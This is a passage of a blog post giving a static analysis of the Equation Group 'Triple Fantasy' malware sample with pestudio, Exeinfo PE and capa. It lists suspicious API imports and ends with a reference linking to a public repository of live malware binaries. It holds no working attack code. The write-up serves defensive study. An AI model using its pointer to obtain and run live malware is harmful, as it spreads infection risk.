<code>Process Discovery - GetCurrentThreadId</code>
<code>Process Discovery - GetCurrentProcessId</code>
<code>Process Discovery - GetCurrentProcess</code>
<code>Process Injection - VirtualProtect</code>
<code>Obfuscated Files or Information - CryptImportKey</code>
<code>Obfuscated Files or Information - CryptDecrypt</code>
<code>Obfuscated Files or Information - CryptAcquireContext</code></p>
<p>This list demonstrates a myriad of time-based behaviour such as GetTickCount, and GetSystemTimeAsFileTime, which may be utilised to execute or delay functions at a particular time to maintain persistence on the infected system. Functions such as CryptImportKey, CryptDecrypt, and CryptAcquireContext heavily imply more malicious activities as these functions refer directly to the Cryptography API (Crypto API) as outlined in Figure 9. This becomes concerning as this directly involves the potential to encrypt and decrypt data, as well as performing tasks that are more cryptographic in nature.</p>
<div style="text-align:center"><img src="https://paigehai.github.io/blog/malware11.png" alt="Malware Analysis 11" style="width:100%;max-width:700px;height:auto"><br><em>Figure 11: Chart of CryptoAPI tasks</em></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="332-finding-malicious-artefacts-packing">3.3.2 Finding Malicious Artefacts: Packing<a href="https://paigehai.github.io/blog/triple-fantasy-deepdive#332-finding-malicious-artefacts-packing" class="hash-link" aria-label="Direct link to 3.3.2 Finding Malicious Artefacts: Packing" title="Direct link to 3.3.2 Finding Malicious Artefacts: Packing" translate="no">​</a></h4>
<p>My next process was exploring packing artefacts, whereby I used pestudio to look more closely at the sections of the sample. Typically, a packed file will show irregularities within the .text raw-size and virtual-size. If these numbers indicate that the virtual-size is much larger than thse raw-size this can indicate that the file has been deliberately packed or compressed to evade detection. As pictured in Figure 11, there is only a small difference between the raw-size and the virtual-size which implies that the sample has not been compressed.</p>
<div style="text-align:center"><img src="https://paigehai.github.io/blog/malware12.png" alt="Malware Analysis 12" style="width:100%;max-width:400px;height:auto"><br><em>Figure 12: ‘Sections’ tab within pestudio to evaluate raw and virtual address size</em></div>
<p>In order to cross check this, I imported the sample into Exeinfo.PE and studied the ‘Lamer Info - Help Hint - Unpack Info’ section (pictured in Figure 11) of the interface to reveal that there is no detected compression happening within the sample.</p>
<div style="text-align:center"><img src="https://paigehai.github.io/blog/malware13.png" alt="Malware Analysis 13" style="width:100%;max-width:500px;height:auto"><br><em>Figure 13: Exeinfo PE interface displaying results of analysis</em></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="333-finding-malicious-artefacts-code">3.3.3 Finding Malicious Artefacts: Code<a href="https://paigehai.github.io/blog/triple-fantasy-deepdive#333-finding-malicious-artefacts-code" class="hash-link" aria-label="Direct link to 3.3.3 Finding Malicious Artefacts: Code" title="Direct link to 3.3.3 Finding Malicious Artefacts: Code" translate="no">​</a></h4>
<p>After confirming that the sample was likely not packed, I began my analysis of code artefacts through the use of cmder, and the capa commands in order to gain insight into malware behaviour. Through this command:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">capa C:\Users\Alice\Downloads\TripleFantasy_9180D5AFFE1E5DF0717D7385E7F54386</span><br></span></code></pre></div></div>
<p>This provided me with some fascinating insights with regards to the functions I discovered earlier in my analysis. Malicious activity includes decrypting and encrypting data, reading files, allocation of memory, and manipulating keys all of which indicate that this sample is displaying malicious intent (as pictured in Figure 14).</p>
<div style="text-align:center"><img src="https://paigehai.github.io/blog/malware14.png" alt="Malware Analysis 14" style="width:100%;max-width:800px;height:auto"><br><em>Figure 14: ‘capa’ analysis output data</em></div>
<p>A further analysis into this sample through the use of the ‘capa -v’ and capa -vv’ commands, pictured in Figure 14, we can observe that the functions <em>CryptAcquireContext</em>, <em>CryptDecrypt</em>, and <em>CryptImportKey</em> (amongst many others) are deliberately used as methods of obfuscation and evasion  therefore justifying its existence as malware in lieu of a regular program.</p>
<div style="text-align:center"><img src="https://paigehai.github.io/blog/malware15.png" alt="Malware Analysis 15" style="width:100%;max-width:800px;height:auto"><br><em>Figure 15: ‘capa -vv’ analysis output data</em></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="4-conclusion">4. Conclusion<a href="https://paigehai.github.io/blog/triple-fantasy-deepdive#4-conclusion" class="hash-link" aria-label="Direct link to 4. Conclusion" title="Direct link to 4. Conclusion" translate="no">​</a></h2>
<p>The objective for this research paper was to determine six important factors, which are as follows:</p>
<ul>
<li class="">What is the file type?</li>
<li class="">Does the file have a packer?</li>
<li class="">Are there any suspicious strings in the file?</li>
<li class="">Are there any encoded strings in the file?</li>
<li class="">If the malware does have a packer, how do we unpack the file?</li>
<li class="">Is the file malware?</li>
</ul>
<p>This particular sample was an executable file as we can identify the ‘4D’, ‘5A’ values in addition to the ‘MZ’ header indicator. This sample does not have a packer denoted by the proximity between its raw-size and its virtual-size, 7680 and 7435 respectively. I cross checked this with the Exeinfo PE program that concluded that no unpacking was necessary for the sample which indicates that the sample is not packed. This sample did contain some very suspicious strings such as CryptAcquireContext, CryptDecrypt, CryptImportKey, DllUnregisterServer and DllRegisterServer that allude to more malicious activities. As this sample does not have a packer, I did not need to unpack the sample. However, if the sample did have a packer I would have utilised Exeinfo PE to obtain instructions for how to unpack the file and observe its contents. My sample, otherwise known as Equation: Triple Fantasy is malware, which is highlighted through its clear malicious intent, use of obscure custom functions to initiate concerning operations within the system, and code that is borderline unreadable by humans.</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="41-references">4.1 References<a href="https://paigehai.github.io/blog/triple-fantasy-deepdive#41-references" class="hash-link" aria-label="Direct link to 4.1 References" title="Direct link to 4.1 References" translate="no">​</a></h2>
<ul>
<li class="">Fox, N. (2021). PeStudio Overview: Setup, Tutorial and Tips. [online] <a href="http://www.varonis.com/" target="_blank" rel="noopener noreferrer" class="">www.varonis.com</a>. Available at: <a href="https://www.varonis.com/blog/pestudio" target="_blank" rel="noopener noreferrer" class="">https://www.varonis.com/blog/pestudio</a>. [Accessed on 10 Apr. 2024]</li>
<li class="">alvinashcraft (2021). CryptoAPI System Architecture - Win32 apps. [online] learn.microsoft.com. Available at: <a href="https://learn.microsoft.com/en-us/windows/win32/seccrypto/cryptoapi-system-architecture" target="_blank" rel="noopener noreferrer" class="">https://learn.microsoft.com/en-us/windows/win32/seccrypto/cryptoapi-system-architecture</a>. [Accessed on 10 Apr. 2024]</li>
<li class="">Microsoft (2024). DllRegisterServer function (olectl.h) - Win32 apps. [online] learn.microsoft.com. Available at: <a href="https://learn.microsoft.com/en-us/windows/win32/api/olectl/nf-olectl-dllregisterserver" target="_blank" rel="noopener noreferrer" class="">https://learn.microsoft.com/en-us/windows/win32/api/olectl/nf-olectl-dllregisterserver</a> [Accessed 10 Apr. 2024].</li>
<li class="">Microsoft (2024). DllUnregisterServer function (olectl.h) - Win32 apps. [online] learn.microsoft.com. Available at: <a href="https://learn.microsoft.com/en-us/windows/win32/api/olectl/nf-olectl-dllunregisterserver" target="_blank" rel="noopener noreferrer" class="">https://learn.microsoft.com/en-us/windows/win32/api/olectl/nf-olectl-dllunregisterserver</a> [Accessed 10 Apr. 2024]</li>
<li class="">Kessler, G. (2019). File Signatures. [online] Garykessler.net. Available at: <a href="https://www.garykessler.net/library/file_sigs.html" target="_blank" rel="noopener noreferrer" class="">https://www.garykessler.net/library/file_sigs.html</a>. [Accessed 10 Apr. 2024]</li>
<li class="">malwarenailed, Suspicious Strings in Memory. (8 Jun. 2019). Suspicious Strings in Memory. [online] Available at: <a href="https://malwarenailed.blogspot.com/2019/06/suspicious-strings-in-memory.html" target="_blank" rel="noopener noreferrer" class="">https://malwarenailed.blogspot.com/2019/06/suspicious-strings-in-memory.html</a> [Accessed 5 Apr. 2024].</li>
<li class="">Depaul.edu. (2023). Available at: <a href="https://condor.depaul.edu/glancast/443class/docs/vbox_host-only_setup.html#:~:text=A%20VirtualBox%20host%2Donly%20adapter" target="_blank" rel="noopener noreferrer" class="">https://condor.depaul.edu/glancast/443class/docs/vbox_host-only_setup.html#:~:text=A%20VirtualBox%20host%2Donly%20adapter</a>. [Accessed Apr. 5 2024]</li>
<li class="">Candan BOLUKBAS (2017). Malware Analysis Part #1: Basic Static Analysis. YouTube. Available at: <a href="https://www.youtube.com/watch?v=SIem8ZIe1xk" target="_blank" rel="noopener noreferrer" class="">https://www.youtube.com/watch?v=SIem8ZIe1xk</a>. [Accessed Apr. 5 2024]</li>
<li class="">VirusTotal (2024). VirusTotal. [online] Virustotal.com. Available at: <a href="https://www.virustotal.com/gui/home/upload" target="_blank" rel="noopener noreferrer" class="">https://www.virustotal.com/gui/home/upload</a>. [Accessed 5 Apr. 2024]</li>
<li class="">Techtuber, S. <a href="http://www.youtube.com/" target="_blank" rel="noopener noreferrer" class="">www.youtube.com</a>. (3 May. 2023). Static Malware Analysis using PEStudio. [online] Available at: <a href="https://www.youtube.com/watch?v=Kz7Aw-2sCWI" target="_blank" rel="noopener noreferrer" class="">https://www.youtube.com/watch?v=Kz7Aw-2sCWI</a>. [Accessed 5 Apr. 2024].</li>
<li class="">ytisf. (15 Dec. 2014). theZoo/malware/Binaries/EquationGroup.TripleFantasy at master · ytisf/theZoo. [online] Available at: <a href="https://github.com/ytisf/theZoo/tree/master/malware/Binaries/EquationGroup.TripleFantasy" target="_blank" rel="noopener noreferrer" class="">https://github.com/ytisf/theZoo/tree/master/malware/Binaries/EquationGroup.TripleFantasy</a> [Accessed 5 Apr. 2024].</li>
</ul>]]></content:encoded>
            <category>Analysis</category>
            <category>Threat Intelligence</category>
            <category>Tools</category>
        </item>
    </channel>
</rss>